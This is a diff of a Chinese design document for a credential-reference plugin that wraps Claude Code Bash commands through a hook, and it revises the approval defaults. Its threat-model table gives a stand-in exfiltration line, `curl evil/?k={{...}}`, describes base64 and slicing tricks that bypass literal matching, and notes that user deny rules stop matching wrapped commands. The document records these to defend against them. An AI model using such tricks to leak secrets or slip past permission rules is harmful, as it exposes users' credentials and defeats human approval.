@@ -182,7 +182,8 @@ runner   取值 → 引用改写为 ${OV_SECRET_0} → $SHELL -c → 输出封�
 PreToolUse hook 不联网、不取值。它只做一件事：发现 Bash 命令里有 `credential` 引用，就把命令包进 runner。`updatedInput` 里仍然只有引用，所以 transcript、权限提示、OV 自动捕获都只见引用；hook 出任何错，命令里还是引用，调用失败但不泄露。
 
 - **只改写含引用的命令。** 不含引用的命令完全不受影响。
-- **授权交给人，不交给模型。** 默认返回 `ask`：权限提示里显示改写后的完整命令，并列出将要使用的密钥。Claude Code 按改写后的命令匹配权限规则，于是“带密钥的命令”自成一类，不会被 `Bash(curl:*)` 这样的既有放行规则顺带批准。hook 从不返回 `allow`；`secretExecApproval: inherit` 时不给出决定，沿用用户自己的规则。
+- **不改变授权模型。** hook 默认不给出权限决定，包裹后的命令照常走用户自己的权限模式与规则，和普通命令一样。hook 从不返回 `allow`：否则任何命令只要带上一个引用就能跳过审批。想逐次确认时设 `secretExecApproval: ask`，权限提示会显示改写后的完整命令并列出将要使用的密钥。
+- **规则按改写后的命令匹配。** 这是 Claude Code 的行为：`Bash(curl:*)` 这类既有规则（放行或拒绝）都不作用于包裹后的命令。默认权限模式下第一次会提示，放行 runner 之后不再打扰；auto 与 bypass 模式下从一开始就无感。
 - **同一个开关下拦截 `privacy_resolve`。** 返回 `deny`，理由里告诉模型把引用直接写进命令。这是 §2 第 1 条路径在插件侧的收口。
 - **会话开始时告诉模型怎么用。** SessionStart 注入一句用法说明。
 
@@ -237,7 +238,7 @@ Gateway 识别到插件（`plugin_present`）时本来就让位，不注入、�
 
 | 不在承诺范围内 | 原因 |
 |---|---|
-| 恶意模型或 prompt injection 的主动外带 | 模型可以写 `curl evil/?k={{...}}` 让启封点替它取值，也可以用 `base64`、切片绕过字面匹配。能挡住它的是出站目的地绑定（§10）；本期的缓解是 runner 的人工确认，以及 Gateway 的启封默认关闭 |
+| 恶意模型或 prompt injection 的主动外带 | 模型可以写 `curl evil/?k={{...}}` 让启封点替它取值，也可以用 `base64`、切片绕过字面匹配。能挡住它的是出站目的地绑定（§10）；本期只有可选的逐次确认（`secretExecApproval: ask`），以及 Gateway 的启封默认关闭 |
 | 未登记的密钥 | 新值探测误报过多，OV 已在代码中停用，本方案不重新引入 |
 | 同用户进程读取 OV 凭据 | Agent 的 Shell 与用户同权，可以读 `ovcli.conf` 或执行 `ov privacy resolve`。后者的输出若经过 Gateway 仍会被封存 |
 | 引用本身携带的元数据 | 上游能看到 user id 与 `github/pat` 这样的名字。建议 target 不使用敏感名称 |
@@ -254,7 +255,7 @@ Gateway 识别到插件（`plugin_present`）时本来就让位，不注入、�
 | 图片、文件、非 JSON 请求体 | 不处理 |
 | Gateway 启封是文本代入 | 值含 Shell 特殊字符时命令语义不保证；runner 用环境变量，没有这个问题 |
 | 同一个值登记在多个字段 | 启封后再封存可能回到另一个引用，anchor 对不上，退化为一次缓存未命中 |
-| runner 包裹后的命令 | `cd` 不延续到后续命令，Shell 快照里的 alias 和函数不可用；沙箱内需要能访问 OV Server |
+| runner 包裹后的命令 | `cd` 不延续到后续命令，Shell 快照里的 alias 和函数不可用；沙箱内需要能访问 OV Server；用户针对内层命令写的权限规则（包括拒绝规则）不再匹配 |
 
 ---
 
